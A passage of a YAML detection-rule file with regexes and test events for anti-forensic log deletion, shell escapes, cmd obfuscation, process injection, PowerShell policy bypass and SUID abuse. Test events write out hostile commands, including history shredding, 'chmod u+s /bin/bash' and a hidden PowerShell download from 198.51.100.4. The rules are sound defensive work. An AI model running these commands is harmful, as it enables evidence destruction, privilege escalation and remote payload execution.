- id: TB-EVADE-015
  name: Anti-forensic deletion of logs, history, prefetch or remote-tool artefacts
  severity: medium
  confidence: 65
  techniques: [T1070.004, T1070.003, T1070]
  tags: [defense-evasion, anti-forensics]
  tuning: Log rotation tools delete old logs; exclude their process names.
  match:
    any:
      - {field: command_line, regex: '(\bdel\b|\berase\b|remove-item|\brm\b|\bshred\b|\bsdelete(64)?\b|\bwipe\b|\bsrm\b).{0,120}(\\prefetch\\|\\winevt\\logs\\|\.evtx|\\recent\\|automaticdestinations|\\teamviewer\\|\\anydesk\\|\\connectwise|/var/log/(auth|secure|syslog|messages|wtmp|btmp|lastlog|audit)|\.(bash|zsh|python)_history|\.viminfo|\.lesshst)'}
      - {field: command_line, regex: '\bcipher(\.exe)?\s+/w:|\bsdelete(64)?(\.exe)?\s+-[a-z]*[psrz]|\bshred\s+(-\w{1,6}\s+){0,4}-[a-z]{0,4}[zun]'}
      - {field: command_line, regex: 'fsutil(\.exe)?\s+usn\s+deletejournal|vssadmin(\.exe)?\s+delete\s+shadows|wevtutil(\.exe)?\s+epl\b.{0,80}&&.{0,20}wevtutil'}
  tests:
    - {event: {command_line: 'Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])'}, expect_match: true}
    - {event: {command_line: 'sdelete -p 3 C:\Users\bob\secret.docx'}, expect_match: true}
    - {event: {command_line: 'fsutil usn deletejournal /d C:'}, expect_match: true}
    - {event: {command_line: 'shred -u ~/.bash_history'}, expect_match: true}
    - {name: deleting a temp file, event: {command_line: 'del /f %temp%\build.tmp'}, expect_match: false}
    - {name: removing a build directory, event: {command_line: 'rm -rf ./build'}, expect_match: false}

- id: TB-EXEC-012
  name: Shell spawned from an editor, pager or multiplexer escape, or busybox applet shell
  severity: medium
  confidence: 65
  techniques: [T1059.004, T1548.003]
  tags: [execution, shell-escape, gtfobins]
  match:
    any:
      - {field: command_line, regex: '(sudo\s+)?(emacs|vim?|nano|less|more|man|awk|gawk|find|nmap|git|ftp|gdb|zip|tar|rsync|socat|script|expect|ed|ex)\s.{0,100}(\(term\s+"/bin/(ba)?sh|--eval\s+.{0,20}term|-c\s+:!?\s?sh|!(/bin/)?(ba)?sh\b|-exec\s+/bin/(ba)?sh|--checkpoint-action=exec=\S{0,20}sh|-e\s+"?(ba)?sh|system\("/bin/(ba)?sh)'}
      - {field: command_line, regex: '^\s*busybox\s+(ba)?sh\b'}
  tests:
    - {event: {command_line: "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'"}, expect_match: true}
    - {event: {command_line: 'busybox sh &'}, expect_match: true}
    - {event: {command_line: 'find / -perm -4000 -exec /bin/sh -p \;'}, expect_match: true}
    - {event: {command_line: 'less /var/log/syslog'}, expect_match: false}
    - {event: {command_line: 'find /var/log -name "*.gz" -mtime +30 -delete'}, expect_match: false}

- id: TB-EXEC-013
  name: cmd.exe environment-variable substring obfuscation
  severity: medium
  confidence: 65
  techniques: [T1027.010, T1059.003]
  tags: [obfuscation, cmd]
  match:
    any:
      - {field: command_line, regex: '%[a-z_]{3,20}:~-?\d{1,3}(,-?\d{1,3})?%\S{0,3}\s{0,3}/[a-z]\b'}
      - {field: command_line, regex: '(%[a-z_]{3,20}:~-?\d{1,3},-?\d{1,3}%){2,6}'}
      - {field: command_line, regex: '(set\s{1,3}\w{1,6}=\S{1,20}&){3,8}'}
  tests:
    - {event: {command_line: '%LOCALAPPDATA:~-3,1%md /c echo hello > hello.txt & type hello.txt'}, expect_match: true}
    - {event: {command_line: 'cmd /c %COMSPEC:~0,1%%COMSPEC:~4,1%%COMSPEC:~-1,1% /c whoami'}, expect_match: true}
    - {name: ordinary variables, event: {command_line: 'cmd /c echo %USERPROFILE% & dir %TEMP%'}, expect_match: false}

- id: TB-EXEC-014
  name: Process-injection API sequence in a script or command line
  severity: high
  confidence: 75
  techniques: [T1055, T1055.001, T1055.012]
  tags: [injection, defense-evasion]
  match:
    any:
      - {field: command_line, regex: '(virtualallocex|ntallocatevirtualmemory).{0,200}(writeprocessmemory|ntwritevirtualmemory).{0,200}(createremotethread|ntcreatethreadex|queueuserapc|rtlcreateuserthread|setthreadcontext)'}
      - {field: command_line, regex: 'add-type\s.{0,200}(writeprocessmemory|createremotethread|ntmapviewofsection|queueuserapc|rtlcreateuserthread)'}
      - {field: command_line, regex: 'dllimport\(\s*["'']kernel32(\.dll)?["''].{0,400}(virtualalloc|virtualprotect|createthread|writeprocessmemory)'}
      - {field: command_line, regex: '\b(mavinject|invoke-dllinjection|invoke-reflectivepeinjection|invoke-processhollow|invoke-thread|processhollowing|shellcodeinject\w{0,10}|sharpinject\w{0,10})\b'}
  tests:
    - {event: {command_line: 'powershell -c "Add-Type -MemberDefinition $sig -Name Win32 -Namespace N; [N.Win32]::VirtualAllocEx(...); WriteProcessMemory(...); CreateRemoteThread(...)"'}, expect_match: true}
    - {event: {command_line: 'powershell -c "Add-Type -TypeDefinition $csharp; [Native]::CreateRemoteThread($h)"'}, expect_match: true}
    - {event: {command_line: 'Invoke-DllInjection -ProcessID 1234 -Dll evil.dll'}, expect_match: true}
    - {name: ordinary Add-Type, event: {command_line: 'powershell -c "Add-Type -AssemblyName System.Windows.Forms"'}, expect_match: false}

- id: TB-EXEC-015
  name: PowerShell started with policy bypass and a hidden or inline command
  severity: medium
  confidence: 60
  techniques: [T1059.001, T1562.001]
  tags: [powershell, policy-bypass]
  tuning: CI systems and configuration management use -ExecutionPolicy Bypass with -File; those are excluded. Inline/hidden launches are the signal.
  match:
    all:
      - {field: command_line, regex: 'powershell(\.exe)?\s.{0,200}-(ep|exec|executionpolicy)\s+bypass'}
      - any:
          - {field: command_line, regex: '-(w|window|windowstyle)\s+hidden'}
          - {field: command_line, regex: '-(c|command)\s+["'']?(&|\$|iex|\(|\[)'}
          - {field: command_line, regex: '-(nop|noprofile)\s.{0,60}-(c|command)\s+["'']?\S'}
      - not: {field: command_line, regex: '-(f|file)\s+["'']?\S{1,200}\.ps1'}
  tests:
    - {event: {command_line: 'powershell -ExecutionPolicy Bypass -W Hidden -c "Get-Process"'}, expect_match: true}
    - {event: {command_line: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument)"'}, expect_match: false}
    - {name: CI build script by file, event: {command_line: 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\build\run.ps1'}, expect_match: false}
    - {name: inline command with bypass, event: {command_line: 'powershell -nop -ep bypass -c "& { iwr 198.51.100.4/a }"'}, expect_match: true}

- id: TB-PRIV-008
  name: SUID/SGID enumeration or setuid bit applied to a shell or interpreter
  severity: medium
  confidence: 60
  techniques: [T1548.001]
  tags: [privilege-escalation, suid, linux]
  match:
    any:
      - {field: command_line, regex: '\bfind\s+/\S{0,20}\s.{0,40}-perm\s+(-?(u=s|g=s|4000|2000|6000)|/(u=s|4000|6000))'}
      - {field: command_line, regex: '\bchmod\s+(u\+s|g\+s|\+s|[2467][0-7]{3})\s+\S{0,60}(bash|sh|zsh|dash|python\w{0,4}|perl|ruby|vim|find|cp|nmap|env)\b'}
  tests:
    - {event: {command_line: 'find /usr/bin -perm -4000'}, expect_match: true}
    - {event: {command_line: 'chmod u+s /bin/bash'}, expect_match: true}
    - {event: {command_line: 'chmod 755 /usr/local/bin/deploy.sh'}, expect_match: false}
    - {event: {command_line: 'find /var/log -name "*.gz" -mtime +30'}, expect_match: false}

- id: TB-EXEC-016
  name: Signed system binary pointed at a payload in a user-writable staging directory (proxy execution)
  severity: high
  confidence: 70
  techniques: [T1218, T1127, T1202]
  tags: [lolbin, proxy-execution, staging]
  tuning: Developer machines legitimately run dotnet/msbuild/csc on files under Downloads; exclude by account or by repository path.
